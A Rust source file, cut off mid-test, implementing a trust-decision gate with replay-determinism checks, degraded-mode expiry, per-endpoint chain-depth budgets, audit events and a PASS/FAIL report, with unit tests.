//! bd-kiqr: Trust-system complexity risk controls.
//!
//! Detects and mitigates trust-system complexity by enforcing:
//! 1. Deterministic trust decision replay (INV-RTC-REPLAY)
//! 2. Degraded-mode trust contracts (INV-RTC-DEGRADED)
//! 3. Trust complexity budgets (INV-RTC-BUDGET)
//! 4. Trust decision audit tracking (INV-RTC-AUDIT)
//!
//! # Event Codes
//!
//! - `RTC-001`: Trust decision replay verified — deterministic
//! - `RTC-002`: Trust decision replay diverged — non-determinism detected
//! - `RTC-003`: Degraded-mode trust decision — subsystem unavailable
//! - `RTC-004`: Trust complexity budget exceeded — decision chain too deep
//!
//! # Invariants
//!
//! - **INV-RTC-REPLAY**: Every trust decision is deterministically replayable
//! - **INV-RTC-DEGRADED**: Degraded-mode has explicit contract with max duration
//! - **INV-RTC-BUDGET**: Decision chain depth does not exceed complexity budget
//! - **INV-RTC-AUDIT**: Trust decision outcomes are tracked with dashboard visibility

use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::fmt;

use crate::capacity_defaults::aliases::MAX_EVENTS;
const MAX_DECISIONS: usize = 4096;
const MAX_REPLAY_RESULTS: usize = 4096;

// ---------------------------------------------------------------------------
// Event codes
// ---------------------------------------------------------------------------

pub mod event_codes {
    pub const RTC_001_REPLAY_VERIFIED: &str = "RTC-001";
    pub const RTC_002_REPLAY_DIVERGED: &str = "RTC-002";
    pub const RTC_003_DEGRADED_MODE: &str = "RTC-003";
    pub const RTC_004_BUDGET_EXCEEDED: &str = "RTC-004";
}

use event_codes::*;

// ---------------------------------------------------------------------------
// Invariant constants
// ---------------------------------------------------------------------------

pub const INV_RTC_REPLAY: &str = "INV-RTC-REPLAY";
pub const INV_RTC_DEGRADED: &str = "INV-RTC-DEGRADED";
pub const INV_RTC_BUDGET: &str = "INV-RTC-BUDGET";
pub const INV_RTC_AUDIT: &str = "INV-RTC-AUDIT";

// ---------------------------------------------------------------------------
// Trust decision outcome
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TrustOutcome {
    Grant,
    Deny,
    Escalate,
    Degraded,
}

impl TrustOutcome {
    pub fn label(&self) -> &'static str {
        match self {
            Self::Grant => "grant",
            Self::Deny => "deny",
            Self::Escalate => "escalate",
            Self::Degraded => "degraded",
        }
    }
}

impl fmt::Display for TrustOutcome {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.label())
    }
}

// ---------------------------------------------------------------------------
// Trust decision context — captures all inputs for replay
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct TrustDecisionContext {
    pub decision_id: String,
    pub endpoint_group: String,
    pub token: String,
    pub epoch: u64,
    pub capability_set: Vec<String>,
    pub clock_value: String,
    pub chain_depth: u32,
}

// ---------------------------------------------------------------------------
// Trust decision record
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct TrustDecision {
    pub context: TrustDecisionContext,
    pub outcome: TrustOutcome,
    pub reason: String,
    pub decided_at: String,
}

// ---------------------------------------------------------------------------
// Replay result
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ReplayResult {
    pub decision_id: String,
    pub original_outcome: TrustOutcome,
    pub replayed_outcome: TrustOutcome,
    pub deterministic: bool,
}

// ---------------------------------------------------------------------------
// Degraded mode state
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct DegradedModeState {
    pub active: bool,
    pub reason: String,
    pub cached_capabilities: Vec<String>,
    pub activated_at: Option<String>,
    pub max_duration_seconds: u64,
    pub elapsed_seconds: u64,
}

impl DegradedModeState {
    pub fn new(max_duration_seconds: u64) -> Self {
        Self {
            active: false,
            reason: String::new(),
            cached_capabilities: Vec::new(),
            activated_at: None,
            max_duration_seconds,
            elapsed_seconds: 0,
        }
    }

    pub fn activate(&mut self, reason: &str, cached_caps: Vec<String>, timestamp: &str) {
        self.active = true;
        self.reason = reason.to_string();
        self.cached_capabilities = cached_caps;
        self.activated_at = Some(timestamp.to_string());
        self.elapsed_seconds = 0;
    }

    pub fn deactivate(&mut self) {
        self.active = false;
        self.reason.clear();
        self.cached_capabilities.clear();
        self.activated_at = None;
        self.elapsed_seconds = 0;
    }

    pub fn is_expired(&self) -> bool {
        self.active && self.elapsed_seconds >= self.max_duration_seconds
    }

    pub fn is_capability_cached(&self, cap: &str) -> bool {
        self.active && self.cached_capabilities.iter().any(|c| c == cap)
    }
}

// ---------------------------------------------------------------------------
// Trust complexity budget
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ComplexityBudget {
    pub default_max_depth: u32,
    pub endpoint_overrides: BTreeMap<String, u32>,
}

impl ComplexityBudget {
    pub fn new(default_max_depth: u32) -> Self {
        Self {
            default_max_depth,
            endpoint_overrides: BTreeMap::new(),
        }
    }

    pub fn max_depth_for(&self, endpoint_group: &str) -> u32 {
        self.endpoint_overrides
            .get(endpoint_group)
            .copied()
            .unwrap_or(self.default_max_depth)
    }

    pub fn set_override(&mut self, endpoint_group: &str, max_depth: u32) {
        self.endpoint_overrides
            .insert(endpoint_group.to_string(), max_depth);
    }

    pub fn exceeds_budget(&self, endpoint_group: &str, chain_depth: u32) -> bool {
        chain_depth > self.max_depth_for(endpoint_group)
    }
}

impl Default for ComplexityBudget {
    fn default() -> Self {
        Self::new(5)
    }
}

// ---------------------------------------------------------------------------
// Trust audit event
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct TrustAuditEvent {
    pub code: String,
    pub decision_id: String,
    pub endpoint_group: String,
    pub outcome: TrustOutcome,
    pub chain_depth: u32,
    pub detail: String,
}

// ---------------------------------------------------------------------------
// Trust audit summary — dashboard snapshot
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct TrustAuditSummary {
    pub total_decisions: u64,
    pub grants: u64,
    pub denials: u64,
    pub escalations: u64,
    pub degraded: u64,
    pub replay_verified: u64,
    pub replay_diverged: u64,
    pub budget_exceeded: u64,
    pub avg_chain_depth: f64,
    pub replay_success_rate_pct: f64,
    pub degraded_mode_activations: u64,
}

// ---------------------------------------------------------------------------
// Trust complexity gate
// ---------------------------------------------------------------------------

pub struct TrustComplexityGate {
    decisions: Vec<TrustDecision>,
    replay_results: Vec<ReplayResult>,
    degraded_state: DegradedModeState,
    budget: ComplexityBudget,
    budget_exceeded_count: u64,
    events: Vec<TrustAuditEvent>,
}

impl TrustComplexityGate {
    pub fn new(budget: ComplexityBudget, max_degraded_duration_seconds: u64) -> Self {
        Self {
            decisions: Vec::new(),
            replay_results: Vec::new(),
            degraded_state: DegradedModeState::new(max_degraded_duration_seconds),
            budget,
            budget_exceeded_count: 0,
            events: Vec::new(),
        }
    }

    /// Record a trust decision and enforce complexity budget.
    pub fn record_decision(&mut self, decision: TrustDecision) -> Result<(), TrustOutcome> {
        let chain_depth = decision.context.chain_depth;
        let endpoint = decision.context.endpoint_group.clone();

        // Check complexity budget
        if self.budget.exceeds_budget(&endpoint, chain_depth) {
            self.budget_exceeded_count = self.budget_exceeded_count.saturating_add(1);
            self.emit_event(
                RTC_004_BUDGET_EXCEEDED,
                &decision.context.decision_id,
                &endpoint,
                TrustOutcome::Deny,
                chain_depth,
                format!(
                    "chain depth {} exceeds budget {} for endpoint group '{}'",
                    chain_depth,
                    self.budget.max_depth_for(&endpoint),
                    endpoint
                ),
            );
            return Err(TrustOutcome::Deny);
        }

        // Record degraded-mode event if applicable
        if decision.outcome == TrustOutcome::Degraded {
            self.emit_event(
                RTC_003_DEGRADED_MODE,
                &decision.context.decision_id,
                &endpoint,
                TrustOutcome::Degraded,
                chain_depth,
                format!("degraded-mode decision: {}", decision.reason),
            );
        }

        push_bounded(&mut self.decisions, decision, MAX_DECISIONS);
        Ok(())
    }

    /// Replay a decision and verify determinism.
    pub fn verify_replay(
        &mut self,
        context: &TrustDecisionContext,
        replay_fn: impl FnOnce(&TrustDecisionContext) -> TrustOutcome,
    ) -> ReplayResult {
        let original = self
            .decisions
            .iter()
            .find(|d| d.context.decision_id == context.decision_id)
            .map(|d| d.outcome);

        let replayed_outcome = replay_fn(context);
        let original_outcome = original.unwrap_or(replayed_outcome);
        let deterministic = original_outcome == replayed_outcome;

        let event_code = if deterministic {
            RTC_001_REPLAY_VERIFIED
        } else {
            RTC_002_REPLAY_DIVERGED
        };

        self.emit_event(
            event_code,
            &context.decision_id,
            &context.endpoint_group,
            replayed_outcome,
            context.chain_depth,
            if deterministic {
                "replay verified: deterministic".to_string()
            } else {
                format!(
                    "replay diverged: original={}, replayed={}",
                    original_outcome, replayed_outcome
                )
            },
        );

        let result = ReplayResult {
            decision_id: context.decision_id.clone(),
            original_outcome,
            replayed_outcome,
            deterministic,
        };

        push_bounded(&mut self.replay_results, result.clone(), MAX_REPLAY_RESULTS);
        result
    }

    /// Enter degraded mode.
    pub fn enter_degraded_mode(&mut self, reason: &str, cached_caps: Vec<String>, timestamp: &str) {
        self.degraded_state.activate(reason, cached_caps, timestamp);
    }

    /// Exit degraded mode.
    pub fn exit_degraded_mode(&mut self) {
        self.degraded_state.deactivate();
    }

    /// Check if degraded mode has expired.
    pub fn is_degraded_expired(&self) -> bool {
        self.degraded_state.is_expired()
    }

    /// Update degraded mode elapsed time.
    pub fn update_degraded_elapsed(&mut self, elapsed_seconds: u64) {
        self.degraded_state.elapsed_seconds = elapsed_seconds;
    }

    /// Check if a capability is available in degraded mode.
    pub fn is_degraded_capability_cached(&self, cap: &str) -> bool {
        self.degraded_state.is_capability_cached(cap)
    }

    /// Gate pass: all invariants satisfied.
    pub fn gate_pass(&self) -> bool {
        // INV-RTC-REPLAY: no replay divergences
        let no_divergence = !self.replay_results.iter().any(|r| !r.deterministic);

        // INV-RTC-DEGRADED: degraded mode not expired
        let degraded_ok = !self.degraded_state.is_expired();

        // INV-RTC-BUDGET: no budget violation has occurred.
        let no_budget_exceeded = self.budget_exceeded_count == 0;

        // INV-RTC-AUDIT: at least some decisions recorded (non-empty)
        let has_audit = !self.decisions.is_empty() || !self.events.is_empty();

        no_divergence && degraded_ok && no_budget_exceeded && has_audit
    }

    pub fn summary(&self) -> TrustAuditSummary {
        let total = u64::try_from(self.decisions.len()).unwrap_or(u64::MAX);
        let grants = u64::try_from(
            self.decisions
                .iter()
                .filter(|d| d.outcome == TrustOutcome::Grant)
                .count()
        ).unwrap_or(u64::MAX);
        let denials = u64::try_from(
            self.decisions
                .iter()
                .filter(|d| d.outcome == TrustOutcome::Deny)
                .count()
        ).unwrap_or(u64::MAX);
        let escalations = u64::try_from(
            self.decisions
                .iter()
                .filter(|d| d.outcome == TrustOutcome::Escalate)
                .count()
        ).unwrap_or(u64::MAX);
        let degraded = u64::try_from(
            self.decisions
                .iter()
                .filter(|d| d.outcome == TrustOutcome::Degraded)
                .count()
        ).unwrap_or(u64::MAX);

        let replay_verified = u64::try_from(
            self.replay_results
                .iter()
                .filter(|r| r.deterministic)
                .count()
        ).unwrap_or(u64::MAX);
        let replay_diverged = u64::try_from(
            self.replay_results
                .iter()
                .filter(|r| !r.deterministic)
                .count()
        ).unwrap_or(u64::MAX);
        let budget_exceeded = self.budget_exceeded_count;

        let total_depth: u64 = self.decisions.iter().fold(0u64, |acc, d| {
            acc.saturating_add(u64::from(d.context.chain_depth))
        });
        let avg_chain_depth = if total > 0 {
            total_depth as f64 / total as f64
        } else {
            0.0
        };

        let replay_total = replay_verified + replay_diverged;
        let replay_success_rate_pct = if replay_total > 0 {
            replay_verified as f64 / replay_total as f64 * 100.0
        } else {
            100.0
        };

        let degraded_activations = u64::try_from(
            self.events
                .iter()
                .filter(|e| e.code == RTC_003_DEGRADED_MODE)
                .count()
        ).unwrap_or(u64::MAX);

        TrustAuditSummary {
            total_decisions: total,
            grants,
            denials,
            escalations,
            degraded,
            replay_verified,
            replay_diverged,
            budget_exceeded,
            avg_chain_depth,
            replay_success_rate_pct,
            degraded_mode_activations: degraded_activations,
        }
    }

    pub fn to_report(&self) -> serde_json::Value {
        let summary = self.summary();
        let verdict = if self.gate_pass() { "PASS" } else { "FAIL" };
        serde_json::json!({
            "bead_id": "bd-kiqr",
            "section": "12",
            "gate_verdict": verdict,
            "summary": summary,
            "invariants": {
                INV_RTC_REPLAY: !self.replay_results.iter().any(|r| !r.deterministic),
                INV_RTC_DEGRADED: !self.degraded_state.is_expired(),
                INV_RTC_BUDGET: self.budget_exceeded_count == 0,
                INV_RTC_AUDIT: !self.decisions.is_empty() || !self.events.is_empty(),
            },
        })
    }

    pub fn decisions(&self) -> &[TrustDecision] {
        &self.decisions
    }

    pub fn replay_results(&self) -> &[ReplayResult] {
        &self.replay_results
    }

    pub fn events(&self) -> &[TrustAuditEvent] {
        &self.events
    }

    pub fn take_events(&mut self) -> Vec<TrustAuditEvent> {
        std::mem::take(&mut self.events)
    }

    pub fn degraded_state(&self) -> &DegradedModeState {
        &self.degraded_state
    }

    fn emit_event(
        &mut self,
        code: &str,
        decision_id: &str,
        endpoint_group: &str,
        outcome: TrustOutcome,
        chain_depth: u32,
        detail: String,
    ) {
        let event = TrustAuditEvent {
            code: code.to_string(),
            decision_id: decision_id.to_string(),
            endpoint_group: endpoint_group.to_string(),
            outcome,
            chain_depth,
            detail,
        };
        push_bounded(&mut self.events, event, MAX_EVENTS);
    }
}

impl Default for TrustComplexityGate {
    fn default() -> Self {
        Self::new(ComplexityBudget::default(), 300)
    }
}

fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
    if cap == 0 {
        items.clear();
        return;
    }
    if items.len() >= cap {
        let overflow = items.len().saturating_sub(cap).saturating_add(1);
        items.drain(0..overflow.min(items.len()));
    }
    items.push(item);
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn make_context(id: &str, depth: u32) -> TrustDecisionContext {
        TrustDecisionContext {
            decision_id: id.to_string(),
            endpoint_group: "default".to_string(),
            token: "tok-abc".to_string(),
            epoch: 1,
            capability_set: vec!["read".to_string(), "write".to_string()],
            clock_value: "2026-01-01T00:00:00Z".to_string(),
            chain_depth: depth,
        }
    }

    fn make_context_for_endpoint(id: &str, endpoint: &str, depth: u32) -> TrustDecisionContext {
        TrustDecisionContext {
            endpoint_group: endpoint.to_string(),
            ..make_context(id, depth)
        }
    }

    fn make_decision(id: &str, outcome: TrustOutcome, depth: u32) -> TrustDecision {
        TrustDecision {
            context: make_context(id, depth),
            outcome,
            reason: "test".to_string(),
            decided_at: "2026-01-01T00:00:00Z".to_string(),
        }
    }

    fn make_decision_for_endpoint(
        id: &str,
        endpoint: &str,
        outcome: TrustOutcome,
        depth: u32,
    ) -> TrustDecision {
        TrustDecision {
            context: make_context_for_endpoint(id, endpoint, depth),
            outcome,
            reason: "test".to_string(),
            decided_at: "2026-01-01T00:00:00Z".to_string(),
        }
    }

    // ── Event codes defined ───────────────────────────────────────────────

    #[test]
    fn event_code_rtc_001_defined() {
        assert_eq!(RTC_001_REPLAY_VERIFIED, "RTC-001");
    }

    #[test]
    fn event_code_rtc_002_defined() {
        assert_eq!(RTC_002_REPLAY_DIVERGED, "RTC-002");
    }

    #[test]
    fn event_code_rtc_003_defined() {
        assert_eq!(RTC_003_DEGRADED_MODE, "RTC-003");
    }

    #[test]
    fn event_code_rtc_004_defined() {
        assert_eq!(RTC_004_BUDGET_EXCEEDED, "RTC-004");
    }

    // ── Invariant constants ───────────────────────────────────────────────

    #[test]
    fn invariant_replay_defined() {
        assert_eq!(INV_RTC_REPLAY, "INV-RTC-REPLAY");
    }

    #[test]
    fn invariant_degraded_defined() {
        assert_eq!(INV_RTC_DEGRADED, "INV-RTC-DEGRADED");
    }

    #[test]
    fn invariant_budget_defined() {
        assert_eq!(INV_RTC_BUDGET, "INV-RTC-BUDGET");
    }

    #[test]
    fn invariant_audit_defined() {
        assert_eq!(INV_RTC_AUDIT, "INV-RTC-AUDIT");
    }

    // ── TrustOutcome ──────────────────────────────────────────────────────

    #[test]
    fn outcome_labels_correct() {
        assert_eq!(TrustOutcome::Grant.label(), "grant");
        assert_eq!(TrustOutcome::Deny.label(), "deny");
        assert_eq!(TrustOutcome::Escalate.label(), "escalate");
        assert_eq!(TrustOutcome::Degraded.label(), "degraded");
    }

    #[test]
    fn outcome_display_matches_label() {
        for outcome in [
            TrustOutcome::Grant,
            TrustOutcome::Deny,
            TrustOutcome::Escalate,
            TrustOutcome::Degraded,
        ] {
            assert_eq!(format!("{outcome}"), outcome.label());
        }
    }

    #[test]
    fn outcome_serde_roundtrip() {
        for outcome in [
            TrustOutcome::Grant,
            TrustOutcome::Deny,
            TrustOutcome::Escalate,
            TrustOutcome::Degraded,
        ] {
            let json = serde_json::to_string(&outcome).unwrap();
            let parsed: TrustOutcome = serde_json::from_str(&json).unwrap();
            assert_eq!(parsed, outcome);
        }
    }

    // ── Complexity budget ─────────────────────────────────────────────────

    #[test]
    fn budget_default_max_depth_is_5() {
        let budget = ComplexityBudget::default();
        assert_eq!(budget.default_max_depth, 5);
    }

    #[test]
    fn budget_returns_default_for_unknown_endpoint() {
        let budget = ComplexityBudget::new(7);
        assert_eq!(budget.max_depth_for("unknown"), 7);
    }

    #[test]
    fn budget_override_takes_precedence() {
        let mut budget = ComplexityBudget::new(5);
        budget.set_override("admin", 10);
        assert_eq!(budget.max_depth_for("admin"), 10);
        assert_eq!(budget.max_depth_for("default"), 5);
    }

    #[test]
    fn budget_exceeds_when_over() {
        let budget = ComplexityBudget::new(3);
        assert!(budget.exceeds_budget("default", 4));
        assert!(!budget.exceeds_budget("default", 3));
        assert!(!budget.exceeds_budget("default", 2));
    }

    // ── Degraded mode ─────────────────────────────────────────────────────

    #[test]
    fn degraded_mode_initially_inactive() {
        let state = DegradedModeState::new(300);
        assert!(!state.active);
        assert!(!state.is_expired());
    }

    #[test]
    fn degraded_mode_activate_sets_fields() {
        let mut state = DegradedModeState::new(300);
        state.activate(
            "epoch service down",
            vec!["read".into()],
            "2026-01-01T00:00:00Z",
        );
        assert!(state.active);
        assert_eq!(state.reason, "epoch service down");
        assert!(state.is_capability_cached("read"));
        assert!(!state.is_capability_cached("write"));
    }

    #[test]
    fn degraded_mode_deactivate_clears() {
        let mut state = DegradedModeState::new(300);
        state.activate("test", vec!["cap".into()], "ts");
        state.deactivate();
        assert!(!state.active);
        assert!(state.reason.is_empty());
    }

    #[test]
    fn degraded_mode_expires_after_max_duration() {
        let mut state = DegradedModeState::new(300);
        state.activate("test", vec![], "ts");
        state.elapsed_seconds = 301;
        assert!(state.is_expired());
    }

    #[test]
    fn degraded_mode_not_expired_within_duration() {
        let mut state = DegradedModeState::new(300);
        state.activate("test", vec![], "ts");
        state.elapsed_seconds = 299;
        assert!(!state.is_expired());
    }

    // ── Gate: record decision ─────────────────────────────────────────────

    #[test]
    fn record_decision_within_budget_succeeds() {
        let mut gate = TrustComplexityGate::default();
        let decision = make_decision("d1", TrustOutcome::Grant, 3);
        assert!(gate.record_decision(decision).is_ok());
        assert_eq!(gate.decisions().len(), 1);
    }

    #[test]
    fn record_decision_exceeding_budget_fails() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(3), 300);
        let decision = make_decision("d1", TrustOutcome::Grant, 4);
        assert!(gate.record_decision(decision).is_err());
        assert!(gate.decisions().is_empty());
    }

    #[test]
    fn record_decision_emits_budget_exceeded_event() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(2), 300);
        let decision = make_decision("d1", TrustOutcome::Grant, 3);
        let _ = gate.record_decision(decision);
        assert!(
            gate.events()
                .iter()
                .any(|e| e.code == RTC_004_BUDGET_EXCEEDED)
        );
    }

    #[test]
    fn record_degraded_decision_emits_rtc_003() {
        let mut gate = TrustComplexityGate::default();
        let decision = make_decision("d1", TrustOutcome::Degraded, 1);
        gate.record_decision(decision).unwrap();
        assert!(
            gate.events()
                .iter()
                .any(|e| e.code == RTC_003_DEGRADED_MODE)
        );
    }

    #[test]
    fn endpoint_override_budget_exceed_fails_even_when_default_allows() {
        let mut budget = ComplexityBudget::new(10);
        budget.set_override("admin", 2);
        let mut gate = TrustComplexityGate::new(budget, 300);
        let decision = make_decision_for_endpoint("admin-over", "admin", TrustOutcome::Grant, 3);

        let err = gate
            .record_decision(decision)
            .expect_err("endpoint override must enforce the lower budget");

        assert_eq!(err, TrustOutcome::Deny);
        assert!(gate.decisions().is_empty());
        let event = gate
            .events()
            .last()
            .expect("budget event should be emitted");
        assert_eq!(event.code, RTC_004_BUDGET_EXCEEDED);
        assert_eq!(event.endpoint_group, "admin");
        assert_eq!(event.outcome, TrustOutcome::Deny);
        assert!(event.detail.contains("exceeds budget 2"));
    }

    #[test]
    fn budget_failure_preempts_degraded_mode_event() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(1), 300);
        let decision = make_decision("degraded-too-deep", TrustOutcome::Degraded, 2);

        let err = gate
            .record_decision(decision)
            .expect_err("budget violation should reject before degraded event");

        assert_eq!(err, TrustOutcome::Deny);
        assert!(gate.decisions().is_empty());
        assert_eq!(gate.events().len(), 1);
        assert_eq!(gate.events()[0].code, RTC_004_BUDGET_EXCEEDED);
        assert!(
            !gate
                .events()
                .iter()
                .any(|event| event.code == RTC_003_DEGRADED_MODE)
        );
    }

    #[test]
    fn budget_exceeded_summary_counts_event_without_denial_decision() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(1), 300);
        let _ = gate.record_decision(make_decision("too-deep", TrustOutcome::Deny, 2));

        let summary = gate.summary();

        assert_eq!(summary.total_decisions, 0);
        assert_eq!(summary.denials, 0);
        assert_eq!(summary.budget_exceeded, 1);
        assert!(!gate.gate_pass());
    }

    #[test]
    fn draining_budget_events_does_not_make_empty_gate_pass() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(1), 300);
        let _ = gate.record_decision(make_decision("too-deep", TrustOutcome::Grant, 2));
        assert!(!gate.gate_pass());

        let events = gate.take_events();

        assert_eq!(events.len(), 1);
        assert!(gate.events().is_empty());
        assert!(gate.decisions().is_empty());
        assert!(!gate.gate_pass());
    }

    // ── Gate: replay verification ─────────────────────────────────────────

    #[test]
    fn replay_deterministic_emits_rtc_001() {
        let mut gate = TrustComplexityGate::default();
        let decision = make_decision("d1", TrustOutcome::Grant, 2);
        gate.record_decision(decision).unwrap();

        let ctx = make_context("d1", 2);
        let result = gate.verify_replay(&ctx, |_| TrustOutcome::Grant);
        assert!(result.deterministic);
        assert!(
            gate.events()
                .iter()
                .any(|e| e.code == RTC_001_REPLAY_VERIFIED)
        );
    }

    #[test]
    fn replay_divergence_emits_rtc_002() {
        let mut gate = TrustComplexityGate::default();
        let decision = make_decision("d1", TrustOutcome::Grant, 2);
        gate.record_decision(decision).unwrap();

        let ctx = make_context("d1", 2);
        let result = gate.verify_replay(&ctx, |_| TrustOutcome::Deny);
        assert!(!result.deterministic);
        assert!(
            gate.events()
                .iter()
                .any(|e| e.code == RTC_002_REPLAY_DIVERGED)
        );
    }

    #[test]
    fn replay_divergence_records_failed_result_and_failed_report_invariant() {
        let mut gate = TrustComplexityGate::default();
        gate.record_decision(make_decision("diverged", TrustOutcome::Grant, 2))
            .unwrap();
        let ctx = make_context("diverged", 2);

        let result = gate.verify_replay(&ctx, |_| TrustOutcome::Escalate);
        let report = gate.to_report();

        assert!(!result.deterministic);
        assert_eq!(gate.replay_results().len(), 1);
        assert_eq!(
            gate.replay_results()[0].original_outcome,
            TrustOutcome::Grant
        );
        assert_eq!(
            gate.replay_results()[0].replayed_outcome,
            TrustOutcome::Escalate
        );
        assert_eq!(report["gate_verdict"], "FAIL");
        assert_eq!(report["invariants"][INV_RTC_REPLAY], false);
    }

    #[test]
    fn unrecorded_replay_does_not_backfill_decision_audit() {
        let mut gate = TrustComplexityGate::default();
        let ctx = make_context("missing-decision", 1);

        let result = gate.verify_replay(&ctx, |_| TrustOutcome::Deny);

        assert!(result.deterministic);
        assert!(gate.decisions().is_empty());
        assert_eq!(gate.replay_results().len(), 1);
        assert!(
            gate.events()
                .iter()
                .any(|event| event.code == RTC_001_REPLAY_VERIFIED)
        );
    }

    // ── Gate: gate_pass ───────────────────────────────────────────────────

    #[test]
    fn gate_passes_with_clean_state() {
        let mut gate = TrustComplexityGate::default();
        let decision = make_decision("d1", TrustOutcome::Grant, 2);
        gate.record_decision(decision).unwrap();

        let ctx = make_context("d1", 2);
        gate.verify_replay(&ctx, |_| TrustOutcome::Grant);
        assert!(gate.gate_pass());
    }

    #[test]
    fn gate_fails_on_replay_divergence() {
        let mut gate = TrustComplexityGate::default();
        let decision = make_decision("d1", TrustOutcome::Grant, 2);
        gate.record_decision(decision).unwrap();

        let ctx = make_context("d1", 2);
        gate.verify_replay(&ctx, |_| TrustOutcome::Deny);
        assert!(!gate.gate_pass());
    }

    #[test]
    fn gate_fails_on_budget_exceeded() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::new(2), 300);
        let decision = make_decision("d1", TrustOutcome::Grant, 3);
        let _ = gate.record_decision(decision);
        assert!(!gate.gate_pass());
    }

    #[test]
    fn gate_fails_on_degraded_expired() {
        let mut gate = TrustComplexityGate::default();
        let decision = make_decision("d1", TrustOutcome::Grant, 1);
        gate.record_decision(decision).unwrap();
        gate.enter_degraded_mode("test", vec![], "ts");
        gate.update_degraded_elapsed(301);
        assert!(!gate.gate_pass());
    }

    #[test]
    fn gate_fails_when_empty() {
        let gate = TrustComplexityGate::default();
        assert!(!gate.gate_pass());
    }

    #[test]
    fn expired_degraded_mode_fails_report_invariant_without_decisions() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::default(), 10);
        gate.enter_degraded_mode("dependency outage", vec!["read".into()], "ts");
        gate.update_degraded_elapsed(10);

        let report = gate.to_report();

        assert!(gate.is_degraded_expired());
        assert!(!gate.gate_pass());
        assert_eq!(report["gate_verdict"], "FAIL");
        assert_eq!(report["invariants"][INV_RTC_DEGRADED], false);
    }

    #[test]
    fn deactivated_degraded_mode_clears_cached_capability_and_expiry() {
        let mut gate = TrustComplexityGate::new(ComplexityBudget::default(), 10);
        gate.enter_degraded_mode("dependency outage", vec!["read".into()], "ts");
        gate.update_degraded_elapsed(10);
        assert!(gate.is_degraded_expired());
        assert!(gate.is_degraded_capability_cached("read"));

        gate.exit_degraded_mode();

        assert!(!gate.is_degraded_expired());
        assert!(!gate.is_degraded_capability_cached("read"));
        assert!(!gate.degraded_state().active);
        assert!(gate.degraded_state().reason.is_empty());
    }

    // ── Summary ───────────────────────────────────────────────────────────

    #[test]
    fn summary_counts_outcomes_correctly() {
        let mut gate = TrustComplexityGate::default();
        gate.record_decision(make_decision("d1", TrustOutcome::Grant, 1))
            .unwrap();
        gate.record_decision(make_decision("d2", TrustOutcome::Deny, 1))
            .unwrap();
        gate.record_decision(make_decision("d3", TrustOutcome::Escalate, 1))
            .unwrap();
        gate.record_decision(make_decision("d4", TrustOutcome::Degraded, 1))
            .unwrap();

        let s = gate.summary();
        assert_eq!(s.total_decisions, 4);
        assert_eq!(s.grants, 1);
        assert_eq!(s.denials, 1);
        assert_eq!(s.escalations, 1);
        assert_eq!(s.degraded, 1);
    }

    #[test]
    fn summary_avg_chain_depth_correct() {
        let mut gate = TrustComplexityGate::default();
        gate.record_decision(make_decision("d1", TrustOutcome::Grant, 2))
            .unwrap();
        gate.record_decision(make_decision("d2", TrustOutcome::Grant, 4))
            .unwrap();
        let s = gate.summary();
        assert!((s.avg_chain_depth - 3.0).abs() < f64::EPSILON);
    }

    #[test]
    fn summary_replay_rate_100_when_all_deterministic() {
        let mut gate = TrustComplexityGate::default();
        gate.record_decision(make_decision("d1", TrustOutcome::Grant, 1))
            .unwrap();
        let ctx = make_context("d1", 1);
        gate.verify_replay(&ctx, |_| TrustOutcome::Grant);
        let s = gate.summary();
        assert!((s.replay_success_rate_pct - 100.0).abs() < f64::EPSILON);
    }

    #[test]
    fn summary_replay_rate_0_when_all_diverged() {
        let mut gate = TrustComplexityGate::default();
        gate.record_decision(make_decision("d1", TrustOutcome::Grant, 1))
            .unwrap();
        let ctx = make_context("d1", 1);
        gate.verify_replay(&ctx, |_| TrustOutcome::Deny);
        let s = gate.summary();
        assert!(s.replay_success_rate_pct < 1.0);
    }

    // ── Report ────────────────────────────────────────────────────────────

    #[test]
    fn report_has_bead_id() {
        let gate = TrustComplexityGate::default();
        let report = gate.to_report();
        assert_eq!(report["bead_id"], "bd-kiqr");
    }

    #[test]
    fn report_has_invariants() {
        let gate = TrustComplexityGate::default();
        let report = gate.to_report();
        assert!(report.get("invariants").is_some());
    }

    #[test]
    fn report_verdict_pass_when_clean() {
        let mut gate = TrustComplexityGate::default();
        gate.record_decision(make_decision("d1", TrustOutcome::Grant, 1))
            .unwrap();
        let ctx = make_context("d1", 1);
        gate.verify_replay(&ctx, |_| TrustOutcome::Grant);
        let report = gate.to_report();
        assert_eq!(report["gate_verdict"], "PASS");
    }

    #[test]
    fn report_verdict_fail_when_divergence() {
        let mut gate = TrustComplexityGate::default();
        gate.record_decision(make_decision("d1", TrustOutcome::Grant, 1))
            .unwrap();
        let ctx = make_context("d1", 1);
        gate.verify_replay(&ctx, |_| TrustOutcome::Deny);
        let report = gate.to_report();
        assert_eq!(report["gate_verdict"], "FAIL");
    }

    // ── take_events ───────────────────────────────────────────────────────

    #[test]
    fn take_events_drains() {
        let mut gate = TrustComplexityGate::default();
        gate.record_decision(make_decision("d1", TrustOutcome::Degraded, 1))
            .unwrap();
        let events = gate.take_events();
